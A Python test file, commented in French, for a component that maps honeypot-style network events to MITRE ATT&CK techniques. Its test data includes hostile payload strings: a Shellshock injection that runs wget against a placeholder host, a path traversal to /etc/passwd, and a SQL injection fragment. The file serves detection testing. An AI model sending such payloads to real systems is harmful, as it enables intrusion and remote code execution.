"""La correspondance ATT&CK doit être explicite : mieux vaut « non classé » qu'une étiquette fausse."""

from ipaddress import IPv4Address

import pytest

from shield.collector.enrichment.mitre import TECHNIQUES, MitreMapper
from shield.common.schema import RawEvent, ServiceName


@pytest.fixture(scope="module")
def mapper():
    return MitreMapper()


def event(**overrides) -> RawEvent:
    base = dict(
        service=ServiceName.SSH,
        source_ip=IPv4Address("192.0.2.10"),
        source_port=1234,
        dest_port=22,
    )
    base.update(overrides)
    return RawEvent(**base)


@pytest.mark.parametrize(
    "payload,username,password,expected",
    [
        (b"", "root", "123456", "T1110.001"),  # devinette de mot de passe
        (b"", "root", "", "T1110.003"),  # pulverisation
        (b"SSH-2.0-zgrab", "", "", "T1046"),  # decouverte de service
        (b"GET /../../etc/passwd", "", "", "T1083"),  # decouverte de fichiers
        (b"GET /?q=union select 1", "", "", "T1190"),  # exploitation
        (b"() { :;};wget http://x/y", "", "", "T1059"),  # interpreteur de commandes
    ],
)
def test_correspondances_attendues(mapper, payload, username, password, expected):
    assert mapper.map(event(payload=payload, username=username, password=password)) == expected


def test_toutes_les_techniques_produites_sont_dans_le_referentiel(mapper):
    samples = [
        event(username="a", password="b"),
        event(username="a"),
        event(),
        event(payload=b"../"),
        event(payload=b"union select"),
        event(payload=b"/bin/sh"),
    ]
    for sample in samples:
        technique = mapper.map(sample)
        assert technique is None or technique in TECHNIQUES


def test_le_libelle_dune_technique_inconnue_ne_casse_pas(mapper):
    assert mapper.label(None) == "non classé"
    assert mapper.label("T9999") == "T9999"
    assert "Brute Force" in mapper.label("T1110.001")


@pytest.mark.parametrize(
    "payload", [b"\x00\xff", b"\xc3\x28", b"A" * 4096, b"", "café".encode("utf-16")]
)
def test_ne_leve_jamais_sur_une_charge_illisible(mapper, payload):
    result = mapper.map(event(payload=payload))
    assert result is None or isinstance(result, str)


def test_la_correspondance_est_deterministe(mapper):
    sample = event(payload=b"GET /../../etc/passwd", username="root", password="x")
    assert len({mapper.map(sample) for _ in range(50)}) == 1
